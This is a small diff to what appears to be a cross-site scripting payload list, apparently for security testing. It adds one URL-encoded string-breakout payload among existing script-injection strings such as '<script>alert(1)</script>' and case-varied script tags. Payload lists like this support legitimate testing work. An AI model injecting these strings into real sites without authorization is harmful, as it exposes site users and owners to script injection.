@@ -15,6 +15,7 @@
 <script>alert(/XSS")</script>
 <script>alert(/XSS/)</script>
 </script><script>alert(1)</script>
+"%3balert(1)%2f%2f124
 "; alert(1);
 ")alert(1);//
 <ScRiPt>alert(1)</sCriPt>
